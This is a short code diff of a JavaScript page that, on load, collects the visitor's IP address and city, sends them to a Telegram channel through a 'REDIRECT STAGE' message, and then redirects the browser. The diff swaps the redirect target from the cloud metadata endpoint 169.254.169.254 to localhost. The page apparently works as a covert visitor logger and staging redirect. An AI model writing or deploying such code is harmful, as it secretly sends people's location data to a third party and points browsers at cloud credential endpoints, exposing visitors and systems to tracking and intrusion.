@@ -26,7 +26,7 @@
 
     function formatMessage(data) {
       return `📄 *[REDIRECT STAGE]*
-🚪 *Redirecting to:* "http://169.254.169.254/latest/meta-data/"
+🚪 *Redirecting to:* "http://localhost:8000/"
 
 🌐 *IP:* ${data.ip || "Unknown"}
 📍 *City:* ${data.city || "Unknown"}
@@ -41,7 +41,7 @@
       const msg = formatMessage(ipData);
       await sendToTelegram(msg);
 
-      window.location.href = "http://169.254.169.254/latest/meta-data/";
+      window.location.href = "http://localhost:8000/";
     }
 
     window.onload = run;
